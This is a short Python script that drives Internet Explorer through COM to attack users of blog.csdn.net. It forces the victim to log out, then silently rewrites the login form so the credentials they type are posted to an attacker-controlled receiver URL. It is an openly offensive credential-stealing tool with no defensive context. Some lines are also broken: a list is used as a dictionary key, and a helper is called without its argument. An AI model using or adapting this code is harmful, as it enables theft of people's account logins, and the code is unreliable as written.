import win32com.client
import time
from requests.utils import quote
from urllib import parse

data_receiver = "http://localhost:8080/"
target_sites = {"blog.csdn.net": {
    "logout_url": "https://passport.csdn.net/account/logout",
    "logout_form": None,
    "login_form_index": 0,
    "owned": False},
}
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
windows = win32com.client.Dispatch(clsid)


def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)


while True:
    for browser in windows:
        url = parse.urlparse(browser.LocationUrl)
        if url.hostname in target_sites:
            if target_sites[url.hostname]["owned"]:
                continue
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname][["logout_url"]])
                wait_for_browser(browser)
            else:
                full_doc = browser.Document.all
                for i in full_doc:
                    try:
                        if i.id ==target_sites[url.hostname]["logout_form"]:
                            i.submit()
                            wait_for_browser()
                    except Exception as e:
                        print(e)
            try:
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s"%(data_receiver,login_page)
                target_sites[url.hostname]["owned"] = True
            except Exception as e:
                print(e)
    time.sleep(5)




